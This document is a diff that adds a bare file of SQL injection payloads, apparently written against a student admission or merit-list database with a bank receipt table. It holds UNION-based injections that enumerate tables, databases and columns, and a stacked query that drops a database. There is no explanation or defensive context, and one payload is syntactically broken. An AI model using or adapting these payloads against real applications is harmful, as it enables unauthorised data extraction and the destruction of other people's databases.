@@ -1,0 +1,16 @@
+' or 1=1 union all select '' as formno,'' as studentname,name as appliedfor,'' as subs,'' as category, '' as meritpoint from sysobjects where xtype='u'--
+
+
+teststt
+
+
+' or 1=1; use master drop database teststt --
+
+' or 1=1 union all select '' as formno,'' as studentname,name as appliedfor,'' as subs,'' as category, 0 as meritpoint from sysdatabases --
+
+' or 1=1 union all select '' as formno,'' as studentname,name as appliedfor,'' as subs,'' as category, 0 as meritpoint INFORMATION_SCHEMA.COLUMNS
+WHERE TABLE_NAME = N'BankReceiptOffLine' --
+
+SELECT *
+FROM INFORMATION_SCHEMA.COLUMNS
+WHERE TABLE_NAME = N'BankReceiptOffLine'
